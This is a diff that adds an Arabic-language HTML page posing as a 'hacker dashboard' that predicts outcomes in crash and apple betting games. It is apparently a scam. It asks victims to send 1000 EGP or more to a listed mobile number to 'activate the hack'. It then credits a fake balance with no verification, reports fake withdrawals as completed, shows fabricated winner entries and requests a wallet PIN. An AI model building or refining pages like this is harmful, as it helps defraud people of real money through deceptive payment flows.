@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacker System & Casino Pro</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: monospace;
+        }
+        body {
+            background-color: #050505;
+            color: #00ff66;
+            margin: 0;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: #0d0d0d;
+            border: 2px solid #00ff66;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+        .balance {
+            background: #111;
+            border: 1px dashed #00ff66;
+            padding: 10px;
+            text-align: center;
+            font-size: 18px;
+            margin-bottom: 15px;
+            color: #fff;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background: #000;
+            color: #00ff66;
+            border: 1px solid #00ff66;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .btn:active {
+            background: #00ff66;
+            color: #000;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            background: #000;
+            border: 1px solid #00ff66;
+            color: #00ff66;
+            border-radius: 5px;
+            text-align: center;
+            font-size: 14px;
+        }
+        input[type="file"] {
+            padding: 7px;
+            cursor: pointer;
+        }
+        h3 {
+            margin: 0 0 10px 0;
+            text-align: center;
+            color: #00ff66;
+            border-bottom: 1px solid #222;
+            padding-bottom: 8px;
+        }
+        .screen {
+            display: none;
+        }
+        .back-btn {
+            background: #ff0033;
+            border-color: #ff0033;
+            color: #fff;
+        }
+        .feed {
+            font-size: 11px;
+            background: #000;
+            border: 1px solid #333;
+            height: 100px;
+            overflow-y: auto;
+            padding: 5px;
+            color: #ffaa00;
+            text-align: right;
+            margin-top: 10px;
+        }
+        #msgBox {
+            display: none;
+            background: #ff0033;
+            color: white;
+            padding: 10px;
+            text-align: center;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            font-weight: bold;
+            font-size: 13px;
+        }
+        .warning-box {
+            background: #260000;
+            border: 1px solid #ff0033;
+            color: #ff3333;
+            padding: 10px;
+            font-size: 12px;
+            text-align: center;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+        .apple-row {
+            display: flex;
+            justify-content: space-between;
+            gap: 5px;
+            margin-bottom: 6px;
+        }
+        .apple-btn {
+            flex: 1;
+            padding: 8px 0;
+            background: #1a1a1a;
+            border: 1px solid #444;
+            color: #fff;
+            cursor: pointer;
+            font-size: 14px;
+            border-radius: 5px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>[ SYSTEM // HACKER DASHBOARD ]</h2>
+    <div id="msgBox"></div>
+
+    <!-- لوحة الرصيد العامة الثابتة -->
+    <div class="container" style="padding: 10px; margin-bottom: 10px;">
+        <div class="balance">
+            الرصيد المتاح: <span id="bal" style="color:#00ff66; font-weight:bold;">0</span> ج.م
+        </div>
+    </div>
+
+    <!-- 1. القائمة الرئيسية -->
+    <div id="menuScreen" class="container">
+        <h3>القائمة الرئيسية</h3>
+        <button class="btn" onclick="showScreen('depositScreen')" style="background:#003311; color:#00ff66;">💳 عملية إيداع الرصيد</button>
+        <button class="btn" onclick="showScreen('planeScreen')">✈️ لعبة الطيارة (Crash 30x)</button>
+        <button class="btn" onclick="showScreen('appleScreen')">🍎 لعبة التفاحة (11 صفاً)</button>
+        <button class="btn" onclick="showScreen('transferScreen')">⚡ تحويل أموال</button>
+        <button class="btn" onclick="showScreen('withdrawScreen')">💸 سحب الأرباح والسيولة</button>
+        <button class="btn" onclick="showScreen('historyScreen')">📜 سجل العمليات والرسائل</button>
+    </div>
+
+    <!-- 1.5 شاشة عملية الإيداع -->
+    <div id="depositScreen" class="container screen">
+        <h3>💳 إيداع رصيد جديد</h3>
+        <div class="warning-box">
+            ⚠️ يجب إيداع مبلغ 1000 جنيه أو أكثر لكي يعمل الهاك بنجاح
+        </div>
+        <div style="background:#111; border:1px solid #00ff66; padding:10px; text-align:center; font-size:13px; margin-bottom:10px; border-radius:5px;">
+            برجاء التحويل على الرقم التالي:<br>
+            <span style="color:#ffaa00; font-size:16px; font-weight:bold; display:block; margin-top:5px;" id="depositNumber">01105436645</span>
+        </div>
+        <input type="number" id="depAmount" placeholder="المبلغ المحول (1000 أو أكثر)">
+        <input type="text" id="depPhone" placeholder="الرقم الذي تم التحويل منه">
+        <label style="font-size:12px; display:block; margin-top:5px; color:#aaa;">صورة إثبات التحويل (اسكرين شوت):</label>
+        <input type="file" id="depScreen" accept="image/*">
+        <button class="btn" onclick="doDeposit()" style="background:#00ff66; color:#000;">تأكيد وإرسال الإيداع</button>
+        <button class="btn back-btn" onclick="goBackToMenu()">الرجوع للقائمة</button>
+    </div>
+
+    <!-- 2. شاشة لعبة الطيارة -->
+    <div id="planeScreen" class="container screen">
+        <h3>✈️ لعبة الطيارة الحقيقية</h3>
+        <div class="balance" style="font-size:14px; padding:6px; margin-bottom:8px;">رصيدك: <span class="balDisp">0</span> ج.م</div>
+        <div id="pMult" style="text-align:center; font-size:32px; color:#ff0033; font-weight:bold; margin: 10px 0;">1.00x</div>
+        <div id="pHackHint" style="font-size:12px; color:#00ff66; text-align:center; margin-bottom:8px;">هاك الطيارة: بانتظار بدء الجولة...</div>
+        <input type="number" id="planeBet" placeholder="مبلغ الرهان">
+        <button class="btn" id="planeBtn" onclick="planeAction()">بدء الإقلاع (إيداع الرهان)</button>
+        <div class="feed" id="pFeed">
+            [+] ID_4421: ربح 3400ج عند 8.5x<br>
+            [+] ID_9912: خسر عند 1.2x<br>
+            [+] ID_7710: ربح 18000ج عند 24.1x<br>
+        </div>
+        <button class="btn back-btn" style="margin-top:10px;" onclick="goBackToMenu()">الرجوع للقائمة</button>
+    </div>
+
+    <!-- 3. شاشة لعبة التفاحة -->
+    <div id="appleScreen" class="container screen">
+        <h3>🍎 لعبة التفاحة (11 صفاً)</h3>
+        <div class="balance" style="font-size:14px; padding:6px; margin-bottom:8px;">رصيدك: <span class="balDisp">0</span> ج.م</div>
+        <div id="aHint" style="font-size:12px; color:#ff3333; text-align:center; margin-bottom:8px;">[هاك التوقعات]: حدد الرهان واضغط بدء الدورة</div>
+        <input type="number" id="appleBetInput" placeholder="مبلغ الرهان">
+        <button class="btn" onclick="startApple()" style="background:#003311;">بدء دورة التفاحة</button>
+        
+        <div id="aGrid" style="margin:10px 0; max-height:220px; overflow-y:auto;"></div>
+        <p id="aStatus" style="font-size:12px; text-align:center; color:#ffaa00; margin:5px 0;"></p>
+        
+        <button class="btn" id="aCash" style="display:none; background:#ffaa00; color:#000;" onclick="cashApple()">سحب الأرباح الحالية</button>
+        <button class="btn back-btn" style="margin-top:10px;" onclick="goBackToMenu()">الرجوع للقائمة</button>
+    </div>
+
+    <!-- 4. شاشة تحويل الأموال -->
+    <div id="transferScreen" class="container screen">
+        <h3>⚡ تحويل أموال</h3>
+        <div class="balance" style="font-size:14px; padding:6px; margin-bottom:8px;">رصيدك: <span class="balDisp">0</span> ج.م</div>
+        <select id="tNet">
+            <option>فودافون كاش</option>
+            <option>اتصالات كاش</option>
+            <option>أورانج كاش</option>
+        </select>
+        <input type="text" id="tPhone" placeholder="رقم الموبايل المحول إليه">
+        <input type="number" id="tAmount" placeholder="المبلغ المراد تحويله">
+        <input type="password" id="tPin" placeholder="الرقم السري">
+        <button class="btn" onclick="doTransfer()">تنفيذ التحويل</button>
+        <button class="btn back-btn" onclick="goBackToMenu()">الرجوع للقائمة</button>
+    </div>
+
+    <!-- 5. شاشة سحب الأرباح -->
+    <div id="withdrawScreen" class="container screen">
+        <h3>💸 سحب الأرباح والسيولة</h3>
+        <div class="balance" style="font-size:14px; padding:6px; margin-bottom:8px;">رصيدك: <span class="balDisp">0</span> ج.م</div>
+        <select id="wMethod">
+            <option>فودافون كاش</option>
+            <option>اتصالات كاش</option>
+            <option>أورانج كاش</option>
+            <option>وي كاش (WE)</option>
+            <option>إنستا باي (InstaPay)</option>
+            <option>بيتكوين (Bitcoin)</option>
+            <option>حساب بنكي</option>
+        </select>
+        <input type="text" id="wAcc" placeholder="رقم الحساب / المحفظة / الإي بان">
+        <input type="number" id="wAmount" placeholder="المبلغ المراد سحبه">
+        <button class="btn" onclick="doWithdraw()">تأكيد طلب السحب</button>
+        <button class="btn back-btn" onclick="goBackToMenu()">الرجوع للقائمة</button>
+    </div>
+
+    <!-- 6. شاشة سجل العمليات -->
+    <div id="historyScreen" class="container screen">
+        <h3>📜 سجل العمليات والرسائل</h3>
+        <div id="hList" style="font-size:11px; color:#ccc; max-height:220px; overflow-y:auto;">
+            <p style="color:#666; text-align:center;">لا توجد عمليات حالياً.</p>
+        </div>
+        <button class="btn back-btn" style="margin-top:10px;" onclick="goBackToMenu()">الرجوع للقائمة</button>
+    </div>
+
+<script>
+    let balance = 0;
+
+    function showMsg(text) {
+        let box = document.getElementById('msgBox');
+        box.innerText = text;
+        box.style.display = 'block';
+        setTimeout(() => { box.style.display = 'none'; }, 3000);
+    }
+
+    function updateBal() {
+        document.getElementById('bal').innerText = balance;
+        document.querySelectorAll('.balDisp').forEach(e => e.innerText = balance);
+    }
+
+    // تفريغ كافة الحقول فوراً عند الانتقال أو الرجوع
+    function clearAllInputs() {
+        document.querySelectorAll('input').forEach(input => {
+            if(input.type !== 'file') input.value = '';
+        });
+    }
+
+    function showScreen(screenId) {
+        clearAllInputs();
+        document.querySelectorAll('.screen').forEach(s => s.style.display = 'none');
+        document.getElementById('menuScreen').style.display = 'none';
+        document.getElementById(screenId).style.display = 'block';
+        updateBal();
+        if(screenId === 'appleScreen') initApple();
+    }
+
+    function goBackToMenu() {
+        clearAllInputs();
+        showScreen('menuScreen');
+    }
+
+    function addHist(txt) {
+        let list = document.getElementById('hList');
+        if(list.innerHTML.includes("لا توجد عمليات")) list.innerHTML = "";
+        list.innerHTML = `<div style="border-bottom:1px solid #222; padding:5px 0;">[⚡] ${txt}</div>` + list.innerHTML;
+    }
+
+    // تنفيذ عملية الإيداع
+    function doDeposit() {
+        let amtInput = document.getElementById('depAmount');
+        let phoneInput = document.getElementById('depPhone');
+        let fileInput = document.getElementById('depScreen');
+
+        if(!amtInput.value || !phoneInput.value || fileInput.files.length === 0) {
+            showMsg("برجاء إدخال المبلغ، الرقم المحول منه، ورفع سكرين شوت التحويل!");
+            return;
+        }
+
+        let amt = parseFloat(amtInput.value);
+        if(amt < 1000) {
+            showMsg("يجب إيداع مبلغ 1000 جنيه أو أكثر لكي يعمل الهاك بنجاح!");
+            return;
+        }
+
+        balance += amt;
+        updateBal();
+        addHist(`إيداع بقيمة ${amt}ج من الرقم (${phoneInput.value}) - الحالة: تمت إضافة الرصيد وتفعيل الهاك بنجاح.`);
+        
+        amtInput.value = '';
+        phoneInput.value = '';
+        fileInput.value = '';
+        
+        showMsg("تم إرسال طلب الإيداع وتحديث رصيدك بنجاح!");
+        showScreen('historyScreen');
+    }
+
+    // التحويل وتفريغ الحقول
+    function doTransfer() {
+        let p = document.getElementById('tPhone');
+        let a = document.getElementById('tAmount');
+        let pin = document.getElementById('tPin');
+        if(!p.value || !a.value || !pin.value) { showMsg("أدخل كافة البيانات!"); return; }
+        let amt = parseFloat(a.value);
+        if(amt > balance) { showMsg("رصيدك غير كافٍ!"); return; }
+        
+        balance -= amt;
+        updateBal();
+        addHist(`تحويل ${amt}ج إلى ${p.value}. الحالة: تم تحويل طلبك، يرجى الانتظار 7 دقائق بحد أدنى وبحد أقصى 24 ساعة.`);
+        
+        clearAllInputs();
+        showMsg("تم إرسال الطلب بنجاح!");
+        showScreen('historyScreen');
+    }
+
+    // السحب وتفريغ الحقول
+    function doWithdraw() {
+        let m = document.getElementById('wMethod').value;
+        let acc = document.getElementById('wAcc');
+        let a = document.getElementById('wAmount');
+        if(!acc.value || !a.value) { showMsg("أدخل البيانات!"); return; }
+        let amt = parseFloat(a.value);
+        if(amt > balance) { showMsg("رصيدك غير كافٍ!"); return; }
+        
+        balance -= amt;
+        updateBal();
+        addHist(`سحب ${amt}ج عبر ${m} (${acc.value}) - الحالة: مكتمل بنجاح.`);
+        
+        clearAllInputs();
+        showMsg("تمت عملية السحب بنجاح!");
+        showScreen('historyScreen');
+    }
+
+    // الطيارة
+    let pTimer = null, pMult = 1.0, pCrash = 1.0, pFlying = false, pBet = 0;
+    function planeAction() {
+        let btn = document.getElementById('planeBtn');
+        let bInput = document.getElementById('planeBet');
+        if(!pFlying) {
+            if(!bInput.value || bInput.value <= 0) { showMsg("أدخل الرهان!"); return; }
+            if(parseFloat(bInput.value) > balance) { showMsg("رصيدك غير كافٍ!"); return; }
+            pBet = parseFloat(bInput.value);
+            balance -= pBet;
+            updateBal();
+            pFlying = true;
+            pMult = 1.0;
+            pCrash = (1.1 + Math.random() * 29).toFixed(2);
+            
+            document.getElementById('pHackHint').innerText = `[هاك الطيارة]: متوقع أن تفرقع عند [${pCrash}x]`;
+            btn.innerText = "💰 سحب الأرباح (Cash Out)";
+            btn.style.background = "#00ff66";
+            btn.style.color = "#000";
+
+            pTimer = setInterval(() => {
+                pMult += 0.15;
+                document.getElementById('pMult').innerText = pMult.toFixed(2) + "x";
+                if(pMult >= parseFloat(pCrash)) {
+                    clearInterval(pTimer);
+                    pFlying = false;
+                    document.getElementById('pMult').innerText = `💥 انفجرت عند ${pCrash}x`;
+                    btn.innerText = "بدء الإقلاع (إيداع الرهان)";
+                    btn.style.background = "#000";
+                    btn.style.color = "#00ff66";
+                    addHist(`خسارة طيارة بمبلغ ${pBet}ج (انفجرت عند ${pCrash}x)`);
+                    bInput.value = "";
+                }
+            }, 250);
+        } else {
+            clearInterval(pTimer);
+            pFlying = false;
+            let win = (pBet * pMult).toFixed(2);
+            balance += parseFloat(win);
+            updateBal();
+            document.getElementById('pMult').innerText = `🎉 ربحت ${win}ج عند ${pMult.toFixed(2)}x!`;
+            btn.innerText = "بدء الإقلاع (إيداع الرهان)";
+            btn.style.background = "#000";
+            btn.style.color = "#00ff66";
+            addHist(`ربح طيارة بمبلغ ${win}ج (أضيف للرصيد)`);
+            bInput.value = "";
+        }
+    }
+
+    // التفاحة (11 صفاً)
+    let aRow = 11, aActive = false, aBetVal = 0, badCol = 2;
+    function initApple() {
+        let g = document.getElementById('aGrid');
+        g.innerHTML = "";
+        for(let r=11; r>=1; r--) {
+            let rowDiv = document.createElement('div');
+            rowDiv.className = 'apple-row';
+            rowDiv.id = `ar-${r}`;
+            for(let c=1; c<=4; c++) {
+                let b = document.createElement('button');
+                b.className = "apple-btn";
+                b.innerText = "🍎";
+                b.onclick = () => pickApple(r, c);
+                rowDiv.appendChild(b);
+            }
+            g.appendChild(rowDiv);
+        }
+        highlightAppleRow();
+    }
+
+    function highlightAppleRow() {
+        for(let r=1; r<=11; r++) {
+            let row = document.getElementById(`ar-${r}`);
+            if(row) {
+                let btns = row.querySelectorAll('button');
+                btns.forEach(b => {
+                    if(r === aRow && aActive) {
+                        b.style.borderColor = "#00ff66";
+                        b.style.background = "#02260f";
+                    } else {
+                        b.style.borderColor = "#444";
+                        b.style.background = "#1a1a1a";
+                    }
+                });
+            }
+        }
+    }
+
+    function startApple() {
+        let bInput = document.getElementById('appleBetInput');
+        if(!bInput.value || bInput.value <= 0) { showMsg("أدخل الرهان!"); return; }
+        if(parseFloat(bInput.value) > balance) { showMsg("رصيدك غير كافٍ!"); return; }
+        aBetVal = parseFloat(bInput.value);
+        balance -= aBetVal;
+        updateBal();
+        aActive = true;
+        aRow = 11;
+        badCol = Math.floor(Math.random() * 4) + 1;
+        initApple();
+        document.getElementById('aHint').innerText = `[هاك التوقعات]: تفاحة سيئة (❌) في الصف ${aRow} هي العامود [${badCol}]`;
+        document.getElementById('aStatus').innerText = "اختر تفاحة من الصف السفلي المضيء (11)";
+        document.getElementById('aCash').style.display = 'block';
+    }
+
+    function pickApple(r, c) {
+        if(!aActive) { showMsg("اضغط بدء دورة التفاحة أولاً!"); return; }
+        if(r !== aRow) { showMsg("اختر من الصف المضيء المتاح حالياً!"); return; }
+        
+        let row = document.getElementById(`ar-${r}`);
+        let btns = row.querySelectorAll('button');
+
+        if(c === badCol) {
+            btns[c-1].innerText = "❌";
+            document.getElementById('aStatus').innerText = `💥 وقعت في التفاحة المعطوبة في عامود ${c}! خسرت.`;
+            addHist(`خسارة تفاحة بمبلغ ${aBetVal}ج`);
+            aActive = false;
+            document.getElementById('aCash').style.display = 'none';
+            document.getElementById('appleBetInput').value = "";
+        } else {
+            btns[c-1].innerText = "🍏";
+            if(aRow > 1) {
+                aRow--;
+                badCol = Math.floor(Math.random() * 4) + 1;
+                highlightAppleRow();
+                document.getElementById('aHint').innerText = `[هاك التوقعات]: تفاحة سيئة في صف ${aRow} هي العامود [${badCol}]`;
+                document.getElementById('aStatus').innerText = `✨ صعدت بنجاح! اختر من الصف ${aRow}`;
+            } else {
+                let win = (aBetVal * 6.0).toFixed(2);
+                balance += parseFloat(win);
+                updateBal();
+                document.getElementById('aStatus').innerText = `🏆 وصلت للقمة (الصف 1) وربحت إجمالي ${win}ج!`;
+                addHist(`ربح تفاحة أسطوري ${win}ج (أضيف للرصيد)`);
+                aActive = false;
+                document.getElementById('aCash').style.display = 'none';
+                document.getElementById('appleBetInput').value = "";
+            }
+        }
+    }
+
+    function cashApple() {
+        if(!aActive) return;
+        let win = (aBetVal * 1.8).toFixed(2);
+        balance += parseFloat(win);
+        updateBal();
+        document.getElementById('aStatus').innerText = `💰 تم سحب الأرباح بقيمة ${win}ج وإعادة ضبط اللعبة!`;
+        addHist(`سحب أرباح تفاحة ${win}ج (أضيفت للرصيد)`);
+        aActive = false;
+        document.getElementById('aCash').style.display = 'none';
+        document.getElementById('appleBetInput').value = "";
+        initApple();
+    }
+</script>
+
+</body>
+</html>
